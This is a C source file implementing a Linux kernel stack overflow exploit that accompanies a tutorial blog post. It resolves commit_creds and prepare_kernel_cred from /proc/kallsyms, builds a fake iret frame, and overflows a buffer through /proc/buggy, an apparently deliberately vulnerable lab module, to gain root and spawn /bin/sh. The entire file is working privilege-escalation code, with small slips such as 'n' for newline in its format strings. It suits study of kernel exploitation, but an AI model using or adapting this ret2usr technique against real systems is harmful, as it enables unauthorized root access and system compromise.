/*
 * Kernel stack overflow basics exploit
 * https://blog.0x80.org/kernel-stack-overflows-basics/
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/user.h>

struct fake_frame {
    void *rip;         // shell()
    uint16_t cs;       // %cs
    uint64_t rflags;   // rflags
    void *rsp;         // %rsp
    uint16_t ss;       // %ss
} __attribute__((packed)) ff;

void* (*prepare_kernel_cred)(void*)  __attribute__((regparm(3)));
void* (*commit_creds)(void*) __attribute__((regparm(3)));

void shell(void) {
    execl("/bin/sh", "sh", 0);
}

void payload(void) {
    commit_creds(prepare_kernel_cred(0));
    asm("mov $ff, %rsp;"
            "iret;");
}

/*
 * Setup the fake frame
 * |ss     | Lower
 * |rsp    |
 * |rflags |
 * |cs     |
 * |rip    |
 */
void setup_ff(void) {
    asm("movw %cs, ff+8;\n"
        "pushfq;     popq ff+10;\n"
         "pushq %rsp; popq ff+18;\n"
        "movw %ss, ff+26;\n");
    ff.rip = &shell;
    ff.rsp -= 1024;
}

int main()
{
    FILE *fd;
    char buf[24];
    *((void**) (buf+20)) = &payload;
    int ret = 0;
    unsigned long addr;
    char dummy;
    char sname[512];

    // Get needed addresses
    fd = fopen("/proc/kallsyms", "r");
    if(fd == NULL) {
        perror("fopen()");
        return -1;
    }
    while(ret != EOF) {
        ret = fscanf(fd, "%p %c %sn", (void **)&addr, &dummy, sname);
        if(prepare_kernel_cred && commit_creds)
            break;
        else
        if(!strncmp(sname, "prepare_kernel_cred", 512))
            prepare_kernel_cred = (void*)addr;
        else
        if(!strncmp(sname, "commit_creds", 512))
            commit_creds = (void*)addr;

    }
    fclose(fd);
    fprintf(stdout, "[+] commit_creds at %pn", (void **)addr);
    fprintf(stdout, "[+] prepare_kernel_cred %pn", (void **)addr);

    // setup fake frame
    fprintf(stdout, "[+] preparing fake frame");
    setup_ff();

    // write payload
    fprintf(stdout, "[+] writing payload to /proc/buggy");
    fd = fopen("/proc/buggy", "w");
    if(fd == NULL) {
        perror("fopen()");
        return -1;
    }
    fwrite(buf, sizeof(buf), 24, fd);
    fclose(fd);

    return 0;
}
